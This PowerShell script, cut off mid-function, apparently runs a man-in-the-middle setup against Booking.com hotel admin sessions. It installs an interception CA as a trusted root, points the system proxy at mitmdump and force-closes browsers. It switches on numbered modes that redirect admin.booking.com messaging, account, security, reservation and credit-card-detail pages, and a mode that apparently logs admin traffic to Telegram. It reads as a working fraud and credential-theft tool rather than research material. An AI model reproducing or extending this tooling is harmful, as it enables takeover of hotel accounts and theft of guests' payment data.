Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ---------------- CONFIG ----------------
$WorkDir = "C:\mitm"
$PyAddon = Join-Path $WorkDir "mitm_redirect_addon.py"
$MitmPort = 8080
$LogFile = Join-Path $WorkDir "mitm_manager.log"
$MitmExeSearch = @(
    "mitmdump",
    "C:\Program Files\Python311\Scripts\mitmdump.exe",
    "C:\Program Files (x86)\Python311\Scripts\mitmdump.exe",
    "C:\Users\chmel\AppData\Local\Programs\Python312\Scripts\mitmdump.exe"
)

# ---------------- ФЛАГИ ФУНКЦИЙ 1-20 ----------------
$ForceFlag = "C:\temp\mitm_force_redirect"
$OneShotFlag = "C:\temp\mitm_reset_once"
$MessageFlag = "C:\temp\mitm_message_once"
$ProviderFlag = "C:\temp\mitm_provider_once"
$UserFlag = "C:\temp\mitm_user_once"
$SecurityFlag = "C:\temp\mitm_security_once"
$Operation11Flag = "C:\temp\mitm_operation_11_once"
$Operation12Flag = "C:\temp\mitm_operation_12_once"
$BookingHotelFlag = "C:\temp\mitm_booking_hotel_once"
$BookingHotelSecurityFlag = "C:\temp\mitm_booking_hotel_security_once"
$Operation16Flag = "C:\temp\mitm_operation_16_once"
$CustomRedirectFlag = "C:\temp\mitm_custom_redirect_once"
$CustomRedirectFromFile = "C:\temp\mitm_custom_redirect_from.txt"
$CustomRedirectToFile = "C:\temp\mitm_custom_redirect_to.txt"
$CustomRedirectDoneFlag = "C:\temp\mitm_custom_redirect_done.txt"
$BookingReservationsFlag = "C:\temp\mitm_booking_reservations_once"
$BookingReservationsHotelIdFile = "C:\temp\mitm_booking_reservations_hotel_id.txt"
$BookingReservationsReportIdFile = "C:\temp\mitm_booking_reservations_report_id.txt"
$BookingCCDetailsFlag = "C:\temp\mitm_booking_cc_details_once"
$BookingCCDetailsBnFile = "C:\temp\mitm_booking_cc_details_bn.txt"
$BookingCCDetailsHotelIdFile = "C:\temp\mitm_booking_cc_details_hotel_id.txt"

# ---------------- ФЛАГИ ФУНКЦИИ 27 ----------------
$BookingReservationsCycleFlag = "C:\temp\mitm_booking_reservations_cycle_once"
$BookingReservationsCycleHotelIdsFile = "C:\temp\mitm_booking_cycle_hotel_ids.txt"
$BookingReservationsCycleReportIdsFile = "C:\temp\mitm_booking_cycle_report_ids.txt"
$BookingReservationsCycleIndexFile = "C:\temp\mitm_booking_cycle_index.txt"
$BookingReservationsCycleActiveFile = "C:\temp\mitm_booking_cycle_active.txt"
$BookingReservationsCycleNextRunFile = "C:\temp\mitm_booking_cycle_next_run.txt"

# ---------------- ФЛАГИ ФУНКЦИЙ 21-26 ----------------
$PartnersFlag = "C:\temp\mitm_partners_once"
$PartnersAndMessFlag = "C:\temp\mitm_partners_and_mess_once"
$DeviceFlag = "C:\temp\mitm_device_once"
$PulseFlag = "C:\temp\mitm_pulse_once"
$UltraPulseFlag = "C:\temp\mitm_ultra_pulse_once"
$MonitorPlatformsFlag = "C:\temp\mitm_monitor_platforms_once"  # ФЛАГ ФУНКЦИИ 26 - НИКОГДА НЕ УДАЛЯТЬ!
$PulseRedirectToFile = "C:\temp\mitm_pulse_redirect_to.txt"
$UltraPulseRedirectToFile = "C:\temp\mitm_ultra_pulse_redirect_to.txt"
$DeviceRedirectDoneFlag = "C:\temp\mitm_device_redirect_done.txt"
$PartnersRedirectDoneFlag = "C:\temp\mitm_partners_redirect_done.txt"

# ---------------- ФЛАГИ ДЛЯ АВТОЗАПУСКА ----------------
$AutostartFlag = "C:\temp\mitm_autostart_active.txt"
$AutostartFunctionFile = "C:\temp\mitm_autostart_function.txt"

# ---------------- ФАЙЛ РЕДИРЕКТА ----------------
$RedirectFile = Join-Path $WorkDir "redirect_target.txt"

# ---------------- ФЛАГ ДЛЯ PULSE ----------------
$PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"

# ========== ОСНОВНЫЕ ФУНКЦИИ ==========

function Test-ValidUrl {
    param([string]$url)
    
    if ([string]::IsNullOrWhiteSpace($url)) {
        return $false
    }
    
    if ($url -notmatch '^https?://') {
        return $false
    }
    
    try {
        $uri = [System.Uri]$url
        return $uri.IsAbsoluteUri -and $uri.Scheme -in @('http', 'https')
    } catch {
        return $false
    }
}

function Log-Write {
    param([string]$msg, [string]$level="INFO")
    $time = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "[{0}] {1} - {2}" -f $time, $level, $msg
    Write-Host $line
    try {
        Add-Content -Path $LogFile -Value $line -Force
    } catch {}
}

function Ensure-WorkDir {
    if (-not (Test-Path $WorkDir)) {
        New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
        Log-Write ("Created work dir: {0}" -f $WorkDir)
    }
}

function Find-Mitmdump {
    foreach ($candidate in $MitmExeSearch) {
        try {
            if ($candidate -eq "mitmdump") {
                $cmd = Get-Command mitmdump -ErrorAction SilentlyContinue
                if ($cmd) {
                    return $cmd.Source
                }
            } elseif (Test-Path $candidate) {
                return $candidate
            }
        } catch {}
    }
    return $null
}

function Reset-Proxy-And-Stop-Mitmdump {
    Log-Write "Stopping processes..."
    Get-Process -Name mitmdump,mitmproxy,mitmweb -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            Log-Write ("Killed mitmdump PID: {0}" -f $_.Id)
        } catch {
            Log-Write ("Failed to kill PID {0}: {1}" -f $_.Id, $_) "WARN"
        }
    }

    try {
        ipconfig /flushdns | Out-Null
        Log-Write "Cache flushed."
    } catch {
        Log-Write ("Failed to flush DNS: {0}" -f $_) "WARN"
    }
}

function Safe-Exit {
    Log-Write "Performing safe exit cleanup..."
    
    Remove-Item -Path $AutostartFlag -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $AutostartFunctionFile -Force -ErrorAction SilentlyContinue
    
    Reset-Proxy-And-Stop-Mitmdump
    Clear-SystemProxies | Out-Null
    Log-Write "Cleanup completed. Exiting."
    exit
}

function Ensure-MitmCA {
    $certFile = Join-Path $env:USERPROFILE ".mitmproxy\mitmproxy-ca-cert.pem"
    if (-not (Test-Path $certFile)) {
        Log-Write ("MITM CA not found at {0}. Generating..." -f $certFile)
        $mitmPath = Find-Mitmdump
        if (-not $mitmPath) {
            Log-Write "mitmdump not found; cannot auto-generate CA." "ERROR"; return $false
        }
        try {
            $proc = Start-Process -FilePath $mitmPath -ArgumentList "--set","block_global=false" -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
            Start-Sleep -Seconds 3
            if ($proc -and -not $proc.HasExited) {
                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
            }
            Start-Sleep -Milliseconds 500
        } catch {
            Log-Write ("Transient mitmdump start failed: {0}" -f $_) "WARN"
        }
    }
    if (-not (Test-Path $certFile)) {
        Log-Write ("No CA pem found at {0}. Please run mitmdump manually." -f $certFile) "ERROR"
        return $false
    }
    try {
        Import-Certificate -FilePath $certFile -CertStoreLocation Cert:\CurrentUser\Root | Out-Null
        Log-Write "Imported."
        return $true
    } catch {
        Log-Write ("Failed to import CA: {0}" -f $_) "ERROR"
        return $false
    }
}

function Set-SystemProxies {
    param([string]$proxyHost="127.0.0.1",[int]$proxyPort=$MitmPort)
    $proxy = "{0}:{1}" -f $proxyHost,$proxyPort
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        Set-ItemProperty -Path $regPath -Name ProxyEnable -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $regPath -Name ProxyServer -Value $proxy -Force
        Set-ItemProperty -Path $regPath -Name ProxyOverride -Value "<local>" -Force

        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinInet {
    [DllImport("wininet.dll", SetLastError=true)]
    public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
}
"@
        $INTERNET_OPTION_SETTINGS_CHANGED = 39
        $INTERNET_OPTION_REFRESH = 37
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_SETTINGS_CHANGED, [IntPtr]::Zero, 0) | Out-Null
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_REFRESH, [IntPtr]::Zero, 0) | Out-Null
        Log-Write ("Set system {0}" -f $proxy)
        return $true
    } catch {
        Log-Write ("Failed to set system proxy: {0}" -f $_) "ERROR"
        return $false
    }
}

function Clear-SystemProxies {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        Set-ItemProperty -Path $regPath -Name ProxyEnable -Value 0 -Type DWord -Force
        Remove-ItemProperty -Path $regPath -Name ProxyServer -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $regPath -Name ProxyOverride -ErrorAction SilentlyContinue

        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinInet {
    [DllImport("wininet.dll", SetLastError=true)]
    public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
}
"@
        $INTERNET_OPTION_SETTINGS_CHANGED = 39
        $INTERNET_OPTION_REFRESH = 37
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_SETTINGS_CHANGED, [IntPtr]::Zero, 0) | Out-Null
        [WinInet]::InternetSetOption([IntPtr]::Zero, $INTERNET_OPTION_REFRESH, [IntPtr]::Zero, 0) | Out-Null
        Log-Write "Cleared WinINET"
        return $true
    } catch {
        Log-Write ("Failed to clear system proxies: {0}" -f $_) "WARN"
        return $false
    }
}

function Close-Browsers-Gracefully {
    param([string]$closeOption)

    if ($closeOption -eq "none") {
        Log-Write "Skipping close."
        return
    }

    Log-Write "Gracefully to preserve session..."

    Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            if ($_.CloseMainWindow()) {
                Log-Write ("Sent close signal to {0} (PID: {1})" -f $_.ProcessName, $_.Id)
            }
        } catch {
            Log-Write ("Error sending close to {0}: {1}" -f $_.ProcessName, $_) "WARN"
        }
    }

    Start-Sleep -Seconds 3

    if ($closeOption -eq "full") {
        Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                Log-Write ("Force closed {0} (PID: {1})" -f $_.ProcessName, $_.Id)
            } catch {
                Log-Write ("Failed to force close {0}: {1}" -f $_.ProcessName, $_) "WARN"
            }
        }
        Log-Write "All browsers fully closed."
    } else {
        $remaining = Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue
        if ($remaining) {
            Log-Write ("Some browsers still running (user may have canceled close): {0}" -f ($remaining.ProcessName -join ", "))
        } else {
            Log-Write "Closed gracefully."
        }
    }
}

function Start-Mitmdump {
    Ensure-WorkDir
    Reset-Proxy-And-Stop-Mitmdump

    $mitmPath = Find-Mitmdump
    if (-not $mitmPath) {
        Log-Write "mitmdump not found!" "ERROR"; return $false
    }

    if (-not (Test-Path $PyAddon)) {
        Log-Write ("Python addon missing: {0}" -f $PyAddon) "ERROR"; return $false
    }

    $args = @("-p", "$MitmPort", "-s", "$PyAddon")

    Log-Write ("Starting: {0} {1}" -f $mitmPath, ($args -join ' '))
    
    Set-SystemProxies | Out-Null
    
    try {
        $proc = Start-Process -FilePath $mitmPath -ArgumentList $args -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
        
        Start-Sleep -Seconds 1
        if ($proc.HasExited) {
            Log-Write "mitmdump failed to start!" "ERROR"
            Clear-SystemProxies | Out-Null
            return $false
        }
        
        Log-Write ("mitmdump started, PID: {0}" -f $proc.Id)
        return $true
    } catch {
        Log-Write ("Failed to start mitmdump: {0}" -f $_) "ERROR"
        Clear-SystemProxies | Out-Null
        return $false
    }
}

function Save-AutostartState {
    param([string]$FunctionName)
    
    try {
        Set-Content -Path $AutostartFlag -Value "ACTIVE" -Force
        Set-Content -Path $AutostartFunctionFile -Value $FunctionName -Force
        Log-Write ("💾 Autostart state saved: {0}" -f $FunctionName)
    } catch {
        Log-Write ("Failed to save autostart state: {0}" -f $_) "WARN"
    }
}

# ========== ФУНКЦИИ ДЛЯ РАБОТЫ С ФЛАГОМ 26 ==========

function Preserve-Function26Flag {
    <#
    .SYNOPSIS
    Сохраняет состояние флага функции 26 перед удалением других флагов
    #>
    return (Test-Path $MonitorPlatformsFlag)
}

function Restore-Function26Flag {
    <#
    .SYNOPSIS
    Восстанавливает флаг функции 26 если он был активен
    #>
    param([bool]$wasEnabled)
    
    if ($wasEnabled) {
        if (-not (Test-Path $MonitorPlatformsFlag)) {
            $null = New-Item -ItemType File -Path $MonitorPlatformsFlag -Force
            Log-Write "✅ Function 26 flag RESTORED - parallel mode active"
        }
    }
}

# ========== ФУНКЦИЯ 26: ПЛАТФОРМ МОНИТОРИНГ (ПАРАЛЛЕЛЬНАЯ) ==========
function Enable-MonitorPlatforms {
    Log-Write "Starting FUNCTION 26..."
    
    Write-Host ""
    Write-Host "=== FUNCTION 26: PLATFORM MONITORING ==="
    Write-Host ""
    Write-Host "[INFO] Monitors selected platforms including admin.booking.com"
    Write-Host "       Telegram logs to appropriate channels"
    Write-Host "       NO redirects - only monitoring"
    Write-Host "       ✅ РАБОТАЕТ ПАРАЛЛЕЛЬНО С ДРУГИМИ ФУНКЦИЯМИ"
    Write-Host "       ✅ ОТКЛЮЧАЕТСЯ ТОЛЬКО КНОПКОЙ 4!"
    Write-Host ""
    
    if (-not (Test-Path (Split-Path $MonitorPlatformsFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $MonitorPlatformsFlag) -Force | Out-Null
    }
    
    # СОЗДАЕМ ФЛАГ ФУНКЦИИ 26
    New-Item -ItemType File -Path $MonitorPlatformsFlag -Force | Out-Null
    
    # Удаляем ТОЛЬКО конфликтующие базовые редиректы
    # НЕ УДАЛЯЕМ флаги других функций!
    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
    
    Log-Write "Function 26 (Platform Monitoring) enabled"
    Save-AutostartState -FunctionName "FUNCTION_26"
    
    Write-Host ""
    Write-Host "✅ Function 26 ACTIVATED" -ForegroundColor Green
    Write-Host "   ✅ Мониторинг платформ АКТИВЕН"
    Write-Host "   ✅ Работает ПАРАЛЛЕЛЬНО с функциями 7-25, 27"
    Write-Host "   ✅ Будет работать ПОКА НЕ ОТКЛЮЧЕНО кнопкой 4"
    Write-Host "   📨 Telegram notifications based on domain"
    Write-Host ""
    
    Start-Mitmdump
}

# ========== ФУНКЦИИ 1-20 ==========

function Enable-ForceRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    if (-not (Test-Path (Split-Path $ForceFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $ForceFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $ForceFlag -Force | Out-Null
    
    @(
        $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "FORCE_REDIRECT"
    Log-Write "Force redirect enabled."
    Start-Mitmdump
}

function Enable-OneShotRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    if (-not (Test-Path (Split-Path $OneShotFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $OneShotFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $OneShotFlag -Force | Out-Null
    
    @(
        $ForceFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "ONE_SHOT_REDIRECT"
    Log-Write "One-shot redirect enabled."
    Start-Mitmdump
}

function Enable-MessageRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    if (-not (Test-Path (Split-Path $MessageFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "FUNCTION_7"
    Log-Write "Booking.com message redirect enabled (function 7)."
    Start-Mitmdump
}

function Enable-ProviderRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    if (-not (Test-Path (Split-Path $ProviderFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $ProviderFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $ProviderFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "FUNCTION_8"
    Log-Write "Booking.com provider redirect enabled (function 8)."
    Start-Mitmdump
}

function Enable-UserRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    if (-not (Test-Path (Split-Path $UserFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $UserFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "FUNCTION_9"
    Log-Write "Booking.com user redirect enabled (function 9)."
    Start-Mitmdump
}

function Enable-SecurityRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    if (-not (Test-Path (Split-Path $SecurityFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $SecurityFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $SecurityFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "FUNCTION_10"
    Log-Write "Booking.com security redirect enabled (function 10)."
    Start-Mitmdump
}

function Enable-Operation11Redirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting Operation 11 sequence (function 7 -> messaging/settings page -> function 8)..."
    
    if (-not (Test-Path (Split-Path $Operation11Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation11Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation11Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $MessageFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "OPERATION_11"
    Start-Mitmdump
    
    Log-Write "Operation 11: Function 7 (message redirect) enabled."
    Log-Write "Function 8 (provider redirect) will activate when user reaches messaging/settings page."
}

function Enable-Operation12Redirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    Log-Write "Starting Operation 12 sequence (function 9 -> accounts_and_permissions page -> function 10)..."
    
    if (-not (Test-Path (Split-Path $Operation12Flag))) {
        New-Item -ItemType Directory -Path (Split-Path $Operation12Flag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $Operation12Flag -Force | Out-Null
    
    if (-not (Test-Path (Split-Path $UserFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $UserFlag -Force | Out-Null
    
    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $SecurityFlag,
        $Operation11Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "OPERATION_12"
    Start-Mitmdump
    
    Log-Write "Operation 12: Function 9 (user redirect) enabled."
    Log-Write "Function 10 (security redirect) will activate when user reaches accounts_and_permissions page."
}

function Enable-BookingHotelRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    if (-not (Test-Path (Split-Path $BookingHotelFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null

    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelSecurityFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
        $BookingCCDetailsHotelIdFile,
        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
        $UltraPulseRedirectToFile,
        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
    ) | ForEach-Object {
        Remove-Item -Path $_ -ErrorAction SilentlyContinue
    }
    
    Restore-Function26Flag -wasEnabled $function26WasEnabled
    
    Save-AutostartState -FunctionName "FUNCTION_13"
    Log-Write "Booking.com HOTEL (global) redirect enabled (function 13)."
    Start-Mitmdump
}

function Disable-BookingHotelRedirect {
    Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
    Log-Write "Booking.com HOTEL (global) redirect disabled (function 13)."
}

function Enable-BookingHotelSecurityRedirect {
    $function26WasEnabled = Preserve-Function26Flag
    
    if (-not (Test-Path (Split-Path $BookingHotelSecurityFlag))) {
        New-Item -ItemType Directory -Path (Split-Path $BookingHotelSecurityFlag) -Force | Out-Null
    }
    New-Item -ItemType File -Path $BookingHotelSecurityFlag -Force | Out-Null

    @(
        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
        $Operation11Flag, $Operation12Flag, $BookingHotelFlag,
        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
